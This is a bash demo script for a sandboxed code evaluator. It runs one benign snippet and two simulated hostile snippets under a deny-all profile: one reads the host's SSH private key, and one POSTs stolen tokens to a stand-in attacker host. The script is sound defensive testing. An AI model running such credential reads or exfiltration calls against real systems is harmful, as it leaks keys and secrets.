#!/usr/bin/env bash
# eval_demo.sh — Demonstrating zero-trust sandboxed execution of AI-generated code snippets

set -euo pipefail

KITE_BIN="${KITE_BIN:-kite}"

echo "======================================================================"
echo " Starkite Agentic AI Evaluation & Tool Execution Demo"
echo "======================================================================"

echo ""
echo "--> Test 1: Legitimate AI Data Processing Snippet"
echo "    Executing untrusted in-memory transformation under strict deny-all..."

AI_CODE_1='
def analyze(data):
    items = data.get("metrics", [])
    total = 0
    for x in items:
        total += x
    avg = total / len(items) if items else 0
    return {
        "status": "success",
        "count": len(items),
        "sum": total,
        "average": avg,
        "digest": hash.text(str(total)).sha256()[:16]
    }

raw_data = {"metrics": [120, 450, 300, 890, 240]}
result = analyze(raw_data)
print(json.encode(result))
'

RESULT_1=$("$KITE_BIN" eval "$AI_CODE_1" --sandbox-profile=deny-all --timeout=5)
echo "    Output: $RESULT_1"

echo ""
echo "--> Test 2: AI Prompt Injection / Host Credential Exfiltration Attack"
echo "    Simulating hostile code attempting to read host SSH private key..."

AI_ATTACK_CODE='
def attack():
    stolen = fs.try_read_text("/root/.ssh/id_rsa")
    if not stolen.ok:
        print(json.encode({"attack_status": "trapped", "error": stolen.error.strip().splitlines()[0]}))
    else:
        print(json.encode({"attack_status": "exfiltrated", "bytes": len(stolen.value)}))
attack()
'

RESULT_2=$("$KITE_BIN" eval "$AI_ATTACK_CODE" --sandbox-profile=deny-all --timeout=5)
echo "    Output: $RESULT_2"

echo ""
echo "--> Test 3: Unauthorized Network Egress Attack"
echo "    Simulating hostile code attempting to exfiltrate telemetry to external webhook..."

AI_EGRESS_CODE='
def exfiltrate():
    resp = http.try_post("https://malicious-collector.evil/drop", body="stolen-tokens", timeout="2s")
    if not resp.ok:
        print(json.encode({"egress_status": "blocked", "error": resp.error.strip().splitlines()[0]}))
    else:
        print(json.encode({"egress_status": "leaked", "status_code": resp.value.status_code}))
exfiltrate()
'

RESULT_3=$("$KITE_BIN" eval "$AI_EGRESS_CODE" --sandbox-profile=deny-all --timeout=5)
echo "    Output: $RESULT_3"

echo ""
echo "======================================================================"
echo " Verification Complete: All AI payloads executed safely inside the"
echo " zero-trust kernel sandbox without host leakage or escape."
echo "======================================================================"
